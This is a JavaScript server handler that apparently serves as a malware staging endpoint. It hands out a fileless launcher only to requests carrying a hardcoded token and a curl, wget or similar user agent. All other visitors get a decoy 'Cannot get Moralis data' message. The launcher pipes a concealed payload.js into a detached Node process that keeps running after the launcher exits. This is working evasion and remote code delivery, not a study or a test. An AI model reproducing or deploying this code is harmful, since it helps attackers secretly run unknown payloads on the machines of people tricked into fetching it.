import fs from "fs";
import path from "path";

export default function handler(req, res) {
  const EXPECTED_TOKEN = "Z4T9QH";

  // Extract token from query string
  const token = String(req.query.token || "").trim();

  // Detect CLI user agent (curl, wget, fetch, httpie)
  function isCLI(ua = "") {
    ua = ua.toLowerCase();
    return (
      ua.includes("curl") ||
      ua.includes("wget") ||
      ua.includes("httpie") ||
      ua.includes("fetch/")
    );
  }

  // If token invalid OR UA not a CLI tool → hard reject
  if (token !== EXPECTED_TOKEN || !isCLI(req.headers["user-agent"])) {
    res.status(200).send("Cannot get Moralis data");
    return;
  }

  // Client-side payload code (same for all OS)
  const scriptPath = path.resolve("./payload.js");
  const payload = fs.readFileSync(scriptPath, "utf-8");

  // Launcher that spawns a detached node reading payload from stdin (no files)
  const launcher = `
/**
 * Launcher (no files):
 * - spawns a detached ` + "`node -`" + ` (read from stdin)
 * - writes the payload into child's stdin and closes it
 * - child keeps running; launcher exits immediately
 */
const cp = require('child_process');

const payload = ${JSON.stringify(payload)};

try {
  // spawn node that reads JS from stdin ('-' tells node to run stdin)
  // stdio: ['pipe', 'ignore', 'ignore'] -> we will write to stdin, ignore child's stdio
  const child = cp.spawn(process.execPath, ['-'], {
    detached: true,
    stdio: ['pipe', 'ignore', 'ignore']
  });

  // Write payload to child's stdin, then close it.
  child.stdin.write(payload);
  child.stdin.end();

  // Detach so parent can exit while child continues
  child.unref();

  process.exit(0);
} catch (err) {
  process.exit(1);
}
`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.send(launcher);
}
